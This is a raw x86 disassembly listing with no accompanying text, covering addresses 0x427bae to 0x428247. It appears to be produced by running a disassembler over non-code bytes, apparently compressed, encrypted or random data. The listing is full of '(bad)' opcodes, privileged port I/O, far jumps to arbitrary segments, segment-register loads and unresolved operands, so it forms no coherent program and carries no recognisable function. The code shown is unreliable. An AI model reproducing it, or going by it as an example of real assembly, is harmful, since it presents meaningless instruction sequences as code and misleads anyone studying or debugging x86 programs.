  427bae:	loopne 0x427b4b
  427bb0:	stc    
  427bb1:	hlt    
  427bb2:	dec    esi
  427bb3:	mov    ch,0x47
  427bb5:	jb     0x427bed
  427bb7:	mov    ds,WORD PTR [esi-0x327dff70]
  427bbd:	add    ebp,DWORD PTR [ebp-0x7a]
  427bc0:	mov    dh,0x55
  427bc2:	jae    0x427c1a
  427bc4:	ret    0x50c3
  427bc7:	xor    esi,DWORD PTR [ecx-0x4f]
  427bca:	test   BYTE PTR [esi-0x17],bh
  427bcd:	push   cs
  427bce:	mov    esi,0x79a30c0c
  427bd3:	jbe    0x427c50
  427bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bd6:	(bad)
  427bda:	outs   dx,DWORD PTR ds:[esi]
  427bdb:	and    BYTE PTR [ebp+0x13],dl
  427bde:	jne    0x427c11
  427be0:	pushf  
  427be1:	push   ebp
  427be2:	in     eax,0x2a
  427be4:	mov    ds,WORD PTR [esi+0x1]
  427be7:	pop    ds
  427be8:	lock xor BYTE PTR [ebp-0x3f],ch
  427bec:	jge    0x427bb4
  427bee:	mov    edx,0x3221cd3b
  427bf3:	iret   
  427bf4:	in     eax,0x55
  427bf6:	mov    edx,0xc12ae93f
  427bfb:	std    
  427bfc:	in     eax,0x15
  427bfe:	sub    ebx,DWORD PTR [edx-0x71504ab8]
  427c04:	dec    eax
  427c05:	outs   dx,BYTE PTR ds:[esi]
  427c06:	nop
  427c07:	cmp    esp,esp
  427c09:	mov    eax,ds:0xfe9fcda2
  427c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c0f:	push   es
  427c10:	fnstsw WORD PTR [ebx+0x7f]
  427c13:	sub    ebp,DWORD PTR [ebp+0xa]
  427c16:	cmp    eax,DWORD PTR [ebx-0x14]
  427c19:	push   edx
  427c1a:	shl    ebp,0xaf
  427c1d:	arpl   WORD PTR [eax+0x57],cx
  427c20:	sbb    eax,0x7108bb9b
  427c25:	mov    edi,0x4c90159b
  427c2a:	pop    ebx
  427c2b:	mov    esi,DWORD PTR [ecx]
  427c2d:	add    eax,0x23442c00
  427c32:	js     0x427c9f
  427c34:	jg     0x427cb5
  427c36:	push   esp
  427c37:	mov    WORD PTR [eax-0x43],fs
  427c3a:	outs   dx,BYTE PTR ds:[esi]
  427c3b:	adc    al,0xe6
  427c3d:	mov    bh,BYTE PTR [edi+0x14]
  427c40:	repz add DWORD PTR [eax],eax
  427c43:	out    0x1,eax
  427c45:	add    BYTE PTR [eax],al
  427c47:	push   0xa60ee15e
  427c4c:	mov    BYTE PTR [ecx-0x3f],bl
  427c4f:	(bad)
  427c53:	fcom   DWORD PTR [eax+0x669ed8c8]
  427c59:	mov    esi,0xaf5a7afc
  427c5e:	pop    ss
  427c5f:	hlt    
  427c60:	cdq    
  427c61:	loope  0x427bee
  427c63:	push   ebx
  427c64:	imul   esi,DWORD PTR [ecx+0x3413aa4a],0xfffffff2
  427c6b:	enter  0xe04d,0xfa
  427c6f:	ins    BYTE PTR es:[edi],dx
  427c70:	hlt    
  427c71:	jo     0x427c87
  427c73:	loope  0x427cd9
  427c75:	xchg   ebx,eax
  427c76:	ja     0x427cac
  427c78:	ins    BYTE PTR es:[edi],dx
  427c79:	or     al,0xe6
  427c7b:	pop    ds
  427c7c:	hlt    
  427c7d:	jp     0x427cf0
  427c7f:	push   ecx
  427c80:	cmp    al,BYTE PTR [esi*4+0x21b5d948]
  427c87:	mov    ah,0x39
  427c89:	push   0xe8567d36
  427c8e:	sub    DWORD PTR [edi-0x4e4ba3da],edi
  427c94:	xchg   edx,eax
  427c95:	test   eax,0xda818e8
  427c9a:	mov    ebp,0xe250f364
  427c9f:	mov    edx,0xd504efe6
  427ca4:	push   esi
  427ca5:	and    al,0x6b
  427ca7:	fisubr DWORD PTR [ecx-0x5dd7d1a2]
  427cad:	or     BYTE PTR [esi-0x2c],cl
  427cb0:	mov    esp,0x4334c087
  427cb5:	rol    DWORD PTR [ebx],cl
  427cb7:	cs je  0x427cc4
  427cba:	ins    DWORD PTR es:[edi],dx
  427cbb:	inc    ecx
  427cbc:	repz xlat BYTE PTR ds:[ebx]
  427cbe:	push   ss
  427cbf:	jnp    0x427c84
  427cc1:	psubsw mm3,QWORD PTR [edi-0x615d6f48]
  427cc8:	mov    al,0x34
  427cca:	or     al,0xd7
  427ccc:	ror    DWORD PTR [esi+0x345d0e87],0x57
  427cd3:	mov    cl,0x6a
  427cd5:	cmp    ebp,0x14e9bc98
  427cdb:	push   edx
  427cdc:	add    BYTE PTR [ebx],bh
  427cde:	aad    0xc8
  427ce0:	dec    ecx
  427ce1:	fcom   DWORD PTR [ecx-0x1faea2bf]
  427ce7:	rcl    DWORD PTR [ebp-0x67],1
  427cea:	pushf  
  427ceb:	mov    ebp,0x3f48f14d
  427cf0:	inc    ebx
  427cf1:	pop    esi
  427cf2:	inc    ecx
  427cf3:	fld    QWORD PTR [eax+0x42]
  427cf6:	or     edi,DWORD PTR [ecx]
  427cf8:	adc    BYTE PTR es:[edi],al
  427cfb:	adc    bl,BYTE PTR [edx-0x26]
  427cfe:	cmp    esi,DWORD PTR [esi+0x45]
  427d01:	add    al,0x58
  427d03:	test   BYTE PTR [edi],0xfa
  427d06:	cmp    eax,DWORD PTR [ebx+0x34]
  427d09:	mov    ch,0xad
  427d0b:	add    bh,BYTE PTR [ecx+0x28b4a785]
  427d11:	or     dl,dh
  427d13:	mov    DWORD PTR [esi],edx
  427d15:	sbb    ch,al
  427d17:	fsub   st,st(3)
  427d19:	jo     0x427d1e
  427d1b:	rol    ah,0x22
  427d1e:	xchg   ecx,eax
  427d1f:	add    edi,0x9e383b16
  427d25:	daa    
  427d26:	mov    ebp,ebp
  427d28:	test   DWORD PTR [edx-0x2ba77e3e],edi
  427d2e:	fstp   DWORD PTR [ecx+esi*1-0x2ea454bc]
  427d35:	mov    DWORD PTR [ecx+0x5097b5b],edi
  427d3b:	sub    ah,BYTE PTR [edx-0x23]
  427d3e:	dec    edx
  427d3f:	out    dx,eax
  427d40:	aas    
  427d41:	push   ebp
  427d42:	pop    edi
  427d43:	push   0xffffffb0
  427d45:	mov    WORD PTR [edi-0x4a],gs
  427d48:	sti    
  427d49:	out    dx,eax
  427d4a:	loop   0x427d9a
  427d4c:	cs pop esp
  427d4e:	push   edi
  427d4f:	or     BYTE PTR [edx],bl
  427d51:	je     0x427cd8
  427d53:	mov    dl,0x11
  427d55:	sar    BYTE PTR [esi+0x59],1
  427d58:	cmp    al,0xbd
  427d5a:	xchg   esp,eax
  427d5b:	dec    esi
  427d5c:	mov    cl,0xee
  427d5e:	sbb    ah,BYTE PTR [ecx-0x6b]
  427d61:	jnp    0x427d17
  427d63:	aaa    
  427d64:	(bad)  
  427d65:	mov    ds:0xbf336e91,al
  427d6a:	mov    DWORD PTR [edi-0x21244ebe],ebx
  427d70:	ja     0x427d42
  427d72:	inc    esp
  427d73:	pop    es
  427d74:	sub    BYTE PTR [edi],ah
  427d76:	jb     0x427d7c
  427d78:	inc    ecx
  427d79:	stos   DWORD PTR es:[edi],eax
  427d7a:	pop    esp
  427d7b:	xor    dh,0xec
  427d7e:	add    bl,BYTE PTR [edi-0x2164815f]
  427d84:	or     ebp,0x4e
  427d87:	ret    0xee5c
  427d8a:	fist   DWORD PTR [ebx+0x5f]
  427d8d:	xchg   edi,eax
  427d8e:	or     al,0xcf
  427d90:	aaa    
  427d91:	or     edi,DWORD PTR [ebp+0x5]
  427d94:	test   ebp,edx
  427d96:	push   esi
  427d97:	dec    esp
  427d98:	scas   eax,DWORD PTR es:[edi]
  427d99:	bound  esi,QWORD PTR [bx+0x55]
  427d9d:	shl    DWORD PTR [esi+ecx*2+0x198125bd],cl
  427da4:	scas   eax,DWORD PTR es:[edi]
  427da5:	add    al,0xcd
  427da7:	xchg   DWORD PTR [esi-0x73],ebp
  427daa:	pop    ebp
  427dab:	in     al,dx
  427dac:	pusha  
  427dad:	cmp    al,BYTE PTR [esi-0x4d2394d6]
  427db3:	xchg   esp,eax
  427db4:	mov    bl,0x71
  427db6:	pusha  
  427db7:	and    eax,0x3fdaab2a
  427dbc:	(bad)  
  427dbd:	imul   ebp,DWORD PTR [esi+0x54af101e],0x81530984
  427dc7:	(bad)  
  427dc8:	je     0x427d9f
  427dca:	inc    esp
  427dcc:	jmp    0x8dfb:0x4473622a
  427dd3:	and    al,0x9c
  427dd5:	std    
  427dd6:	stos   BYTE PTR es:[edi],al
  427dd7:	dec    ecx
  427dd8:	(bad)  
  427dd9:	mov    ebp,0x294fdfce
  427ddf:	pop    esi
  427de0:	ss jb  0x427dd2
  427de3:	mov    ds,WORD PTR [eax-0x79a09f78]
  427de9:	data16 repnz mov dh,0x7e
  427ded:	dec    edi
  427dee:	jg     0x427dab
  427df0:	jmp    0x9b5f:0x3ee5d547
  427df7:	(bad)  
  427df8:	in     al,0xc3
  427dfa:	push   esp
  427dfb:	cmp    ah,BYTE PTR [eax]
  427dfd:	mov    ch,0xc0
  427dff:	es mov ebx,0x9cee68fd
  427e05:	mov    ah,BYTE PTR [eax+0x21]
  427e08:	sub    bl,BYTE PTR [ebx+0x33]
  427e0b:	pop    ecx
  427e0c:	test   DWORD PTR [ecx-0x76],0x59ab4d1
  427e13:	pop    ecx
  427e14:	sbb    eax,0x683e3f50
  427e19:	sub    al,0x20
  427e1b:	fidivr DWORD PTR [ebp-0x7a631e3c]
  427e21:	inc    DWORD PTR [edi]
  427e23:	sub    DWORD PTR [ebx+0x9],edi
  427e26:	push   ss
  427e27:	js     0x427e46
  427e29:	cmc    
  427e2a:	dec    edx
  427e2b:	mov    DWORD PTR [eax-0x1fd4ff55],esi
  427e31:	jnp    0x427e6b
  427e33:	sti    
  427e34:	mov    ebx,0x2946f36b
  427e39:	in     al,dx
  427e3a:	cmp    BYTE PTR [ebp+0x5c],bl
  427e3d:	call   0x2377991
  427e42:	add    bh,ah
  427e44:	add    DWORD PTR [eax],eax
  427e46:	add    BYTE PTR [esi+0xf],bl
  427e49:	imul   bh
  427e4b:	out    0x45,al
  427e4d:	add    DWORD PTR ds:[edi],edx
  427e50:	js     0x427dd9
  427e52:	aas    
  427e53:	pop    ecx
  427e54:	add    BYTE PTR [edi-0x4b],dl
  427e57:	aas    
  427e58:	outs   dx,BYTE PTR ds:[esi]
  427e59:	inc    ebp
  427e5a:	outs   dx,DWORD PTR ds:[esi]
  427e5b:	cli    
  427e5c:	add    DWORD PTR [edi],ebp
  427e5e:	xlat   BYTE PTR ds:[ebx]
  427e5f:	arpl   WORD PTR [esi],bx
  427e61:	test   eax,0xa9acfc0d
  427e66:	mov    dl,0x52
  427e68:	je     0x427e92
  427e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e6b:	inc    edx
  427e6c:	and    ah,bl
  427e6e:	xchg   esi,eax
  427e6f:	popf   
  427e70:	add    al,0x9d
  427e72:	test   DWORD PTR [edi+0x5d],ecx
  427e75:	stos   BYTE PTR es:[edi],al
  427e76:	xchg   edi,eax
  427e77:	xor    ebp,DWORD PTR [esi+0x26a9c588]
  427e7d:	lea    esi,[eax+0x6cfa89e]
  427e83:	pop    ss
  427e84:	fist   WORD PTR [edi+0x17]
  427e87:	retf   
  427e88:	iret   
  427e89:	arpl   WORD PTR [esi-0x7b],dx
  427e8c:	std    
  427e8d:	repz xchg ebx,eax
  427e8f:	pop    edx
  427e90:	(bad)  
  427e91:	in     eax,0x44
  427e93:	mov    dl,0x1a
  427e95:	push   esp
  427e96:	inc    edx
  427e97:	fld    DWORD PTR [edx-0x44]
  427e9a:	out    0xcb,al
  427e9c:	sub    DWORD PTR ds:0x5bca9f9d,edx
  427ea2:	ret    
  427ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ea4:	bound  edi,QWORD PTR [edi-0x41c7a6f1]
  427eaa:	mov    ecx,0xe3f1f2ab
  427eaf:	jp     0x427e35
  427eb1:	sbb    DWORD PTR [esi],ebp
  427eb3:	mov    ds:0xfeb0140b,al
  427eb8:	jp     0x427ec6
  427eba:	push   0x8d4ad8a0
  427ebf:	outs   dx,DWORD PTR ds:[esi]
  427ec0:	add    dh,dh
  427ec2:	rcr    DWORD PTR [ebp+0x9],0xd7
  427ec6:	retf   
  427ec7:	jl     0x427f13
  427ec9:	adc    eax,0xe8f20947
  427ece:	stos   DWORD PTR es:[edi],eax
  427ecf:	jecxz  0x427ecf
  427ed1:	not    DWORD PTR [eax-0x21319ffc]
  427ed7:	mov    eax,0x4cc16005
  427edc:	and    ah,dl
  427ede:	or     al,0x90
  427ee0:	outs   dx,DWORD PTR ds:[esi]
  427ee1:	or     eax,0xb06b6871
  427ee6:	scas   al,BYTE PTR es:[edi]
  427ee7:	mov    dl,0xe9
  427ee9:	xor    DWORD PTR [edx+0x2b542ea7],0x3d
  427ef0:	dec    eax
  427ef1:	sub    al,0x77
  427ef3:	icebp  
  427ef4:	and    esp,DWORD PTR [ebx+eax*1-0xc]
  427ef8:	sub    ah,dh
  427efa:	ins    DWORD PTR es:[edi],dx
  427efb:	xchg   ebx,eax
  427efc:	jo     0x427f11
  427efe:	out    dx,eax
  427eff:	xor    eax,0x5968d8b4
  427f04:	mov    edx,0xffda6d41
  427f09:	inc    eax
  427f0a:	dec    edx
  427f0b:	retf   0x617b
  427f0e:	inc    BYTE PTR [ecx+0x1fbe459d]
  427f14:	push   0x6e
  427f16:	popf   
  427f17:	jle    0x427f21
  427f19:	xchg   edx,esi
  427f1b:	xlat   BYTE PTR ds:[ebx]
  427f1c:	jmp    0xbe83:0x75e5b22f
  427f23:	sub    cl,cl
  427f25:	stos   DWORD PTR es:[edi],eax
  427f26:	push   ebx
  427f27:	shl    BYTE PTR [esi-0x25],cl
  427f2a:	mov    bl,0x68
  427f2c:	(bad)  
  427f2d:	repnz out 0xfb,al
  427f30:	lods   al,BYTE PTR ds:[esi]
  427f31:	and    esp,edx
  427f33:	lahf   
  427f34:	mov    ds:0x9c9c9f40,al
  427f39:	scas   eax,DWORD PTR es:[edi]
  427f3a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f3c:	inc    ebp
  427f3d:	pusha  
  427f3e:	pop    esp
  427f3f:	out    dx,eax
  427f40:	jp     0x427fbe
  427f42:	test   eax,0x3362cbd
  427f47:	nop
  427f48:	mov    edi,0x28b7e253
  427f4d:	in     eax,0xb0
  427f4f:	leave  
  427f50:	dec    esp
  427f51:	pop    esi
  427f52:	sbb    ecx,DWORD PTR ds:0xbf7faf00
  427f58:	scas   eax,DWORD PTR es:[edi]
  427f59:	push   cs
  427f5a:	jbe    0x427f67
  427f5c:	(bad)  [ebx-0x65]
  427f5f:	(bad)  
  427f60:	jo     0x427f4c
  427f62:	das    
  427f63:	fcmovnbe st,st(7)
  427f65:	cmp    eax,0x9d108740
  427f6a:	std    
  427f6b:	loope  0x427f24
  427f6d:	cdq    
  427f6e:	retf   0xd559
  427f71:	fs loope 0x427f4a
  427f74:	pop    ebx
  427f75:	out    dx,al
  427f76:	adc    esi,DWORD PTR [ebx-0x64]
  427f79:	ret    0x91e
  427f7c:	or     DWORD PTR [di-0x12],edi
  427f80:	xchg   esp,eax
  427f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f82:	cld    
  427f83:	je     0x427f89
  427f85:	xchg   edx,eax
  427f86:	cld    
  427f87:	fs mov ecx,0x19e33d98
  427f8d:	sbb    ah,bl
  427f8f:	xchg   BYTE PTR [ecx-0x11],al
  427f92:	popf   
  427f93:	out    dx,al
  427f94:	jecxz  0x427f5a
  427f96:	(bad)  
  427f97:	mov    ebx,0xd6ddeec4
  427f9c:	mov    esi,0xadea0b36
  427fa1:	(bad)  
  427fa2:	sbb    BYTE PTR [ecx-0x4a],bl
  427fa5:	fdivr  st(4),st
  427fa7:	jbe    0x427f89
  427fa9:	out    0xfb,al
  427fab:	out    0xa7,eax
  427fad:	pop    es
  427fae:	pop    esi
  427faf:	fwait
  427fb0:	sbb    eax,0x68eb391b
  427fb5:	add    eax,0xab065c2a
  427fba:	sbb    eax,DWORD PTR [eax]
  427fbc:	sub    DWORD PTR [esi+0x7],esp
  427fbf:	and    bl,BYTE PTR [edi+eax*1]
  427fc2:	or     cl,BYTE PTR [ebx-0x63]
  427fc5:	inc    esi
  427fc6:	jl     0x42801c
  427fc8:	pushf  
  427fc9:	pop    esp
  427fca:	pop    esi
  427fcb:	out    0x9b,eax
  427fcd:	sub    al,0x4
  427fcf:	imul   eax
  427fd1:	cmp    al,0xb2
  427fd3:	call   0x5bb3:0xd167c471
  427fda:	xor    edx,DWORD PTR [ecx+0x70]
  427fdd:	(bad)  [esp+ebp*8-0x510c9479]
  427fe4:	push   edx
  427fe5:	push   ds
  427fe6:	xor    eax,0x67ed2766
  427feb:	add    eax,esi
  427fed:	cmp    al,0x5e
  427fef:	cmp    edi,edi
  427ff1:	sar    DWORD PTR [esi-0x6225dc0a],0x22
  427ff8:	stc    
  427ff9:	cmp    al,0xd5
  427ffb:	jg     0x428005
  427ffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ffe:	pop    esp
  427fff:	out    dx,al
  428000:	js     0x427fd9
  428002:	stos   DWORD PTR es:[edi],eax
  428003:	std    
  428004:	mov    bh,0xa6
  428006:	jno    0x428080
  428008:	cmp    ebx,esi
  42800a:	add    DWORD PTR [esi-0x2495d97d],eax
  428010:	push   eax
  428011:	add    eax,0xd08dd591
  428016:	mov    esp,?
  428018:	jno    0x427fa8
  42801a:	test   BYTE PTR [ebp-0x34004e91],ah
  428020:	stos   BYTE PTR es:[edi],al
  428021:	xor    BYTE PTR es:[edx+edx*8+0x22],dh
  428026:	addr16 push edx
  428028:	adc    DWORD PTR [esi+0x18],0x24
  42802c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42802d:	stos   DWORD PTR es:[edi],eax
  42802e:	add    BYTE PTR [ebx+ecx*4-0x2000283b],dh
  428035:	mov    dh,0xeb
  428037:	inc    ebx
  428038:	cmp    ah,BYTE PTR [esp+eiz*2-0x1e6257c9]
  42803f:	loop   0x428037
  428041:	add    DWORD PTR [eax],eax
  428043:	out    0x1,eax
  428045:	add    BYTE PTR [eax],al
  428047:	retf   0x125
  42804a:	sbb    DWORD PTR [ecx],ecx
  42804c:	dec    ecx
  42804d:	and    eax,0xc232fc3e
  428052:	jns    0x427ff6
  428054:	mov    ?,ebp
  428056:	out    0x45,eax
  428058:	dec    esp
  428059:	push   ebp
  42805a:	nop
  42805b:	xchg   edx,eax
  42805c:	sbb    ah,BYTE PTR [edx-0x74]
  42805f:	imul   esi,DWORD PTR [edi],0xffffffda
  428062:	je     0x4280b0
  428064:	je     0x42802b
  428066:	and    bh,BYTE PTR [eax+edx*2]
  428069:	add    BYTE PTR [ecx+0x370338c9],0x40
  428070:	call   FWORD PTR [ecx-0x42859fc6]
  428076:	jae    0x4280f3
  428078:	inc    eax
  428079:	and    esi,0xffffff87
  42807c:	adc    eax,0x37733dfe
  428081:	push   edx
  428082:	jle    0x4280ae
  428084:	lods   al,BYTE PTR ds:[esi]
  428085:	xor    BYTE PTR [esi+0x38],ah
  428088:	cli    
  428089:	(bad)  
  42808a:	(bad)  
  42808c:	rol    DWORD PTR [ecx+0x478576ed],0x2a
  428093:	pushf  
  428094:	mov    cl,BYTE PTR [edx-0x7b]
  428097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428098:	fldcw  WORD PTR [edi]
  42809a:	cmp    DWORD PTR [edi+ebx*8],0xc6366abd
  4280a1:	and    esi,DWORD PTR [esi+0x4f277c89]
  4280a7:	pop    es
  4280a8:	cmp    eax,eax
  4280aa:	xchg   edx,eax
  4280ab:	push   esp
  4280ac:	push   0xbd7c1e92
  4280b1:	mov    ecx,DWORD PTR [eax]
  4280b3:	pand   mm7,mm1
  4280b6:	fs aas 
  4280b8:	and    al,0xd7
  4280ba:	jno    0x4280e4
  4280bc:	inc    ebp
  4280bd:	dec    esp
  4280be:	lods   al,BYTE PTR ds:[esi]
  4280bf:	pop    edx
  4280c0:	ret    
  4280c1:	mov    ds:0x9d02b3a0,eax
  4280c6:	jg     0x4280e4
  4280c8:	ss pop edx
  4280ca:	jb     0x4280af
  4280cc:	imul   edx,DWORD PTR [ebp+0x26eb2fa],0x35
  4280d3:	out    dx,eax
  4280d4:	mov    edi,edi
  4280d6:	push   esi
  4280d7:	dec    ecx
  4280d8:	adc    DWORD PTR [esi+0x1c535687],ebx
  4280de:	or     cl,BYTE PTR [eax-0x263b02e4]
  4280e4:	or     DWORD PTR [ebp+0x13],esi
  4280e7:	pusha  
  4280e8:	pop    edi
  4280e9:	out    dx,al
  4280ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280eb:	or     eax,0xb08aba69
  4280f0:	and    ebp,DWORD PTR [esi]
  4280f2:	cs mov ah,0x33
  4280f5:	lods   al,BYTE PTR ds:[esi]
  4280f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280f7:	pusha  
  4280f8:	jl     0x428171
  4280fa:	out    0xa,al
  4280fc:	shr    BYTE PTR [ecx],1
  4280fe:	push   ebp
  4280ff:	sar    DWORD PTR ds:0x41b615be,0x17
  428106:	cwde   
  428107:	xchg   edi,eax
  428108:	mov    dl,0x3c
  42810a:	inc    esi
  42810b:	and    eax,0x4df48c50
  428110:	and    eax,0x7ea50b71
  428115:	xchg   esp,eax
  428116:	das    
  428117:	jl     0x42818a
  428119:	xchg   esi,eax
  42811a:	jnp    0x428135
  42811c:	sbb    eax,0x5327c46b
  428121:	or     al,0xf1
  428123:	loop   0x428183
  428125:	mov    bh,0xcd
  428127:	test   edi,ecx
  428129:	out    0x38,eax
  42812b:	cmp    DWORD PTR [edx-0x40f359ca],edi
  428131:	pop    edi
  428132:	ror    DWORD PTR [edx],1
  428134:	inc    ebx
  428135:	loopne 0x4280d5
  428137:	in     ax,0x9b
  42813a:	jl     0x4280d1
  42813c:	xlat   BYTE PTR ds:[ebx]
  42813d:	xchg   edx,eax
  42813e:	jnp    0x4280f0
  428140:	out    dx,eax
  428141:	mov    al,0x45
  428143:	in     al,dx
  428144:	retf   0xa742
  428147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428148:	pop    edi
  428149:	ds push eax
  42814b:	cmp    esp,DWORD PTR ds:0xb3eda5b3
  428151:	into   
  428152:	add    eax,0xf29baebc
  428157:	jb     0x4281be
  428159:	iret   
  42815a:	icebp  
  42815b:	push   cs
  42815c:	cmp    al,BYTE PTR [ecx-0x2c16e766]
  428162:	and    BYTE PTR [edi+edx*2],dl
  428165:	lods   eax,DWORD PTR ds:[esi]
  428166:	imul   edx,DWORD PTR [ebx+ebp*1+0x5f0eee84],0xffffffbb
  42816e:	xor    bl,0x6e
  428171:	sub    DWORD PTR [ecx+0x62],0xdc9b1c36
  428178:	in     al,dx
  428179:	mov    edi,ecx
  42817b:	dec    ebp
  42817c:	test   al,0x8
  42817e:	cmp    al,0x51
  428180:	fiadd  WORD PTR [ecx-0x372c3140]
  428186:	mov    edi,0x3822e32a
  42818b:	adc    edi,ecx
  42818d:	out    0x25,al
  42818f:	sub    edi,esi
  428191:	jmp    0x428113
  428193:	mov    esp,0x64aa19ec
  428198:	pusha  
  428199:	shl    DWORD PTR [eax+0x229a22f1],1
  42819f:	call   ebp
  4281a1:	xor    al,0x63
  4281a3:	ss jmp 0x42812f
  4281a6:	popf   
  4281a7:	test   eax,0x31dd8be9
  4281ac:	adc    DWORD PTR [eax+0x48],0xc1db2b01
  4281b3:	cld    
  4281b4:	loop   0x428154
  4281b6:	jg     0x42819e
  4281b8:	in     eax,0x3e
  4281ba:	push   ebp
  4281bb:	pop    DWORD PTR [esp+ebx*8+0x2a45f8f]
  4281c2:	pop    esp
  4281c3:	add    dl,BYTE PTR [ebp+0xa]
  4281c6:	outs   dx,DWORD PTR ds:[esi]
  4281c7:	push   ebx
  4281c8:	inc    edx
  4281c9:	mov    esi,0xb7a7148b
  4281ce:	jmp    0xd0e4fd53
  4281d3:	ins    DWORD PTR es:[edi],dx
  4281d4:	inc    ebx
  4281d5:	and    al,0xa1
  4281d7:	jns    0x428221
  4281d9:	retf   0x2b48
  4281dc:	repnz lods al,BYTE PTR ss:[esi]
  4281df:	mov    esi,0x2ae87212
  4281e4:	cmp    dl,BYTE PTR [edx-0x48312f48]
  4281ea:	jmp    0x575b:0xc3c9f786
  4281f1:	(bad)  
  4281f2:	loopne 0x42819c
  4281f4:	add    esp,DWORD PTR [ebx+ebx*2-0x5e258123]
  4281fb:	shl    DWORD PTR [edi],0x90
  4281fe:	mov    DWORD PTR ds:0x3ee2446c,esi
  428204:	fild   QWORD PTR [edi+0xc]
  428207:	int3   
  428208:	add    BYTE PTR [edx-0x3ad1dcee],dh
  42820e:	xor    ecx,eax
  428210:	or     ebp,esp
  428212:	hlt    
  428213:	pop    ecx
  428214:	cmp    BYTE PTR [edi+0x41],bh
  428217:	test   eax,0x622c389
  42821c:	aaa    
  42821d:	sub    dh,bh
  42821f:	cmp    ebx,esp
  428221:	fs cmp eax,0xa4b08881
  428227:	mov    al,BYTE PTR [ebp+0x26bf4e2d]
  42822d:	jg     0x42822f
  42822f:	ret    0x2f21
  428232:	cdq    
  428233:	out    dx,eax
  428234:	lahf   
  428235:	idiv   BYTE PTR [ebx+0x2f]
  428238:	fist   DWORD PTR [ebx-0x22121c6e]
  42823e:	sbb    al,0xc9
  428240:	clc    
  428241:	add    DWORD PTR [eax],eax
  428243:	add    DWORD PTR [eax],eax
  428245:	add    BYTE PTR [eax],al
  428247:	or     al,BYTE PTR [eax]
	...
